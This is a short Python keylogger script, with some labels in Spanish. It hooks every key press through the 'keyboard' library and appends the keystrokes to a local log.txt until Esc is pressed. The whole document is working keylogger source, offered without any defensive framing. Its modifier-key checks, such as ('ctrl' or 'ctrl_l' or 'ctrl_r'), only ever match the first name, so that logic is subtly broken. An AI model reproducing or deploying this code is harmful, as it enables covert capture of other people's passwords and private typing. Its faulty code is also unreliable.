import keyboard

def keylogger(clave):
    with open("log.txt", "a") as f:
        if clave.name == "enter":
            f.write("\n")
        elif clave.name == "space":
            f.write(" ")
        elif clave.name == "backspace":
            f.write(" [Borrar] ")
        elif clave.name == "shift":
            f.write(" [Shift] ")
        elif clave.name == ("ctrl" or "ctrl_l" or "ctrl_r"):
            f.write(" [Ctrl] ")
        elif clave.name == ("alt" or "alt_l" or "alt_r"):
            f.write(" [Alt] ")
        elif clave.name == "tab":
            f.write(" [Tab] ")
        else:
            f.write(clave.name)

keyboard.on_press(keylogger)
keyboard.wait("esc") 
